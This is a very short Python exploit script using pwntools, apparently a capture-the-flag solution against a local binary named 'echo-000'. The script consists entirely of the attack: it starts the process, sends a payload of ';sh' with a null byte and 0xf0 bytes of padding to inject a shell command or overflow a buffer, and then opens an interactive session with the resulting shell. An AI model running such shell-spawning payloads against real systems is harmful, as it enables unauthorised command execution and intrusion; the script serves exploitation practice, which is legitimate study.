

from pwn import *

p = process('./echo-000')

p.sendline(";sh\0" + "A"*0xf0)

p.interactive()
